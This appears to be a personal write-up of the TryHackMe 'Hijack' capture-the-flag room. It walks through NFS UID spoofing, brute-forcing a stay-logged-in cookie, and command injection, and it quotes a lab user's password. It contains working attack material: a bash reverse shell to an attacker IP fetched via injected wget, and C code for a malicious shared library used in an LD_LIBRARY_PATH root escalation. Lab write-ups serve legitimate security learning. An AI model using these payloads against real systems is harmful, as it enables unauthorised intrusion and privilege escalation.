# Hijack

***
![](https://tryhackme-images.s3.amazonaws.com/room-icons/8d33165f4e0c5c59dcaced020cfd29d8.png)

## Difficulty = Easy

***


running our nmap scan we have -: 

```bash
# Nmap 7.94 scan initiated Fri Oct 20 20:07:32 2023 as: nmap -p- -sCV -T4 -v --min-rate=1000 -oN nmap.txt 10.10.82.189
Nmap scan report for 10.10.82.189
Host is up (0.14s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE    SERVICE  VERSION
21/tcp    open     ftp      vsftpd 3.0.3
22/tcp    open     ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp    open     http     Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Home
111/tcp   open     rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34027/udp6  mountd
|   100005  1,2,3      34976/udp   mountd
|   100005  1,2,3      45338/tcp6  mountd
|   100005  1,2,3      58529/tcp   mountd
|   100021  1,3,4      33243/tcp   nlockmgr
|   100021  1,3,4      34037/udp6  nlockmgr
|   100021  1,3,4      35439/udp   nlockmgr
|   100021  1,3,4      43097/tcp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open     nfs      2-4 (RPC #100003)
31846/tcp filtered unknown
33243/tcp open     nlockmgr 1-4 (RPC #100021)
35014/tcp open     mountd   1-3 (RPC #100005)
41365/tcp filtered unknown
54306/tcp open     mountd   1-3 (RPC #100005)
55769/tcp filtered unknown
58529/tcp open     mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 20 20:09:11 2023 -- 1 IP address (1 host up) scanned in 99.23 seconds
```

Let first of all check the `nfs` protocol, we will start by mounting shares, run -:

```bash
$ showmount -e 10.10.89.226
$ mkdir mnt
$ sudo mount -t nfs -o vers=3 10.10.89.226:/mnt/share mnt
```


![](https://i.imgur.com/mTm94gH.png)

Running `ls -l` we can see that we have the `/mnt` directory and it belongs to the **UID** and **GID** of `1003`


![](https://i.imgur.com/aFCU92O.png)

So we need to create another user for this and assign **UID** and **GID** `1003` for it, in other to access the `/mnt` directory

![](https://i.imgur.com/fDxUmFn.png)

> **Note :** I created the password for `test` with the command `sudo passwd test`, My password here is **"ctf"** 


Now open up your `/etc/passwd` file and edit the account created as shown below


![](https://i.imgur.com/SE7dYmY.png)

Now switch user to `test` and navigate to the `mnt` directory

![](https://i.imgur.com/KCkCBBF.png)


As we can see we have a `for_employees.txt` file

![](https://i.imgur.com/VS9SfLw.png)


Concatenating it gives us credentials for `FTP` 

![](https://i.imgur.com/sjJBnxy.png)

We can therefore `su` back to our normal user, Logging in as **"ftpuser"** via`FTP` we have -:

![](https://i.imgur.com/1f79KlJ.png)


Great, download both files to our base system with the `mget` command

![](https://i.imgur.com/wB73L0G.png)

Checking `.from_admin.txt` we can see that we have 2 users here, **admin** and **rick**

![](https://i.imgur.com/416FwbG.png)

It also looks like the `.passwords_list.txt` contain few passwords that the admin talked about

![](https://i.imgur.com/snK6yHr.png)

Navigating to port `80/HTTP` we have a website

![](https://i.imgur.com/wAGeqAZ.png)

I couldn't login due to rate limiting that the admin talked about in `.from_admin.txt`, took at least 300 seconds to recover and we have only 5 login attempts per account on lockout 😭

![](https://i.imgur.com/IkeW867.png)


So i decided to create my own account instead located under `/signup.php`, **Creds** = `test:test123`

![](https://i.imgur.com/UKnfyVW.png)


Navigating to the administration page under `/administration.php` we can see we are denied access, literally because we are not **admin**

![](https://i.imgur.com/h4sRqUK.png)

Let intercept the request of this page with `burpsuite` and send the request to **repeater**

![](https://i.imgur.com/eW04oYA.png)


The only thing that looks like something i have learnt in the past is checking if cookies are actually stored as encoded password and username of the current user, Copying the `PHPSESSID` value


![](https://i.imgur.com/KgrTTzD.png)

Then pasting it to burp decoder and decoding from `URL-Decode`, then to `base64` decode, we can see that we truly have the user name **test** in which i used to create the present account

![](https://i.imgur.com/AiQg3Ec.png)

Pasting the hash on [crackstation.net](https://crackstation.net), we can see we truly have the password, `test123`, encoded as **MD5**


![](https://i.imgur.com/1ZWdTyb.png)

Over here we can see a **stay-logged-in cookie bruteforce** vulnerability, we can go ahead and -:
- hash every password we got from the `.passwords_list.txt` file to **MD5**
- Add the username in front, in this case **"Admin"** and base64-encode everything.

Send this request to burp `intruder` and choose **sniper** mode, also make sure to choose the point where `burp` will perform this action

![](https://i.imgur.com/THOGVmO.png)


Navigate to the `payloads` tab and click load, then select the password file, make sure to rename the password file from `.passwords_list.txt` to `Passwd.txt` so burp can see it


![](https://i.imgur.com/GIeLNc9.png)

Under **Payload Processing** make sure to assign the rules as follows -:

- Hash = `MD5`
- Prefix = `admin:`
- Encode = `Base64-encode`

![](https://i.imgur.com/rVXwh4Z.png)

Starting the attack and filtering by **length**, we can see that we are truly logged in as the admin user

![](https://i.imgur.com/nzIfoAU.png)


We can therefore copy the `PHPSESSID` value and change it with the test cookie on the website

![](https://i.imgur.com/r2Dxl51.png)

Reloading the web page we truly have the admin panel which seems to be vulnerable to `command injection`


![](https://i.imgur.com/ll4BnRd.png)

Truly it is vulnerable to **command injection** vulnerability

![](https://i.imgur.com/yKEnkuJ.png)

Since there are alot of detection in trying to gain a reverse shell, we can upload our own bash shell script and start it up, paste this into a file and save it as `.sh` extension

```bash
#!/bin/bash

/bin/sh -i >& /dev/tcp/10.9.75.133/1337 0>&1
```

![](https://i.imgur.com/HgE60kx.png)


Then start up your python server

```bash
$ python3 -m http.server 80
```

![](https://i.imgur.com/uiTEqmv.png)

On the website run this

```bash
127.0.0.1&wget 10.9.75.133/shell.sh
```

Running `127.0.0.1&ls` we can see we have `shell.sh` truly downloaded

![](https://i.imgur.com/qJMKpiT.png)

Start up your listener and run `shell.sh` with

```
127.0.0.1&bash shell.sh
```

![](https://i.imgur.com/MG0RKUN.png)

Running `ls` in `/var/www/html` we have `config.php`, concatenating it gives us user **rick's** Credential


![](https://i.imgur.com/p9ykkh7.png)

Switch user to **rick** with the `su` command using credential, `rick:N3v3rG0nn4G1v3Y0uUp`

![](https://i.imgur.com/SOlzRvb.png)

Running `sudo -l` we can see that we have permissions to run `LD_LIBRARY_PATH` for shared libraries.

![](https://i.imgur.com/drb1RvC.png)

Running `ldd /usr/sbin/apache2` we can see we have `libcrypt.so.1`, which is our main target

![](https://i.imgur.com/8EbwhjA.png)

Add this `C` code as shown below into a file called `library_path.c`

```C
#include <stdio.h>  
#include <stdlib.h>  
   static void hijack() __attribute__((constructor));  
   void hijack() {  
   unsetenv("LD_LIBRARY_PATH");  
   setresuid(0,0,0);  
   system("/bin/bash -p");  
}
```

![](https://i.imgur.com/0akrqrS.png)

Then run the following command in **rick's** home directory

```bash
$ gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```


![](https://i.imgur.com/2XW5F59.png)

Finally run apache2 using sudo, while setting the `LD_LIBRARY_PATH` environment variable to our present working directory (where we output the compiled shared object) and we should be **root**

```bash
$ sudo LD_LIBRARY_PATH=. /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

![](https://i.imgur.com/OqMEseJ.png)

### **_Things i would take note of :_**

- first of all bruteforcing cookies was really new to me, i will keep this in my second brain 😂
- getting root was new to me too, took me almost an hour figuring out that i needed to specify the full command `/usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2` instead of what i do see in public write-ups, just `apache2`
- This box was a really fun box and shout out to [@markuche](https://twitter.com/0xMarkUche) for putting me through the `nfs` file-read bypass

### **_Resources Used :_**

- [Link 1](https://systemweakness.com/write-up-brute-forcing-a-stay-logged-in-cookie-portswigger-academy-ae297242af1d)
- [Link 2](https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/)
- [Link 3](https://www.linkedin.com/pulse/linux-privilege-escalation-techniques-zakwan-abid)


GG 🤟



<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

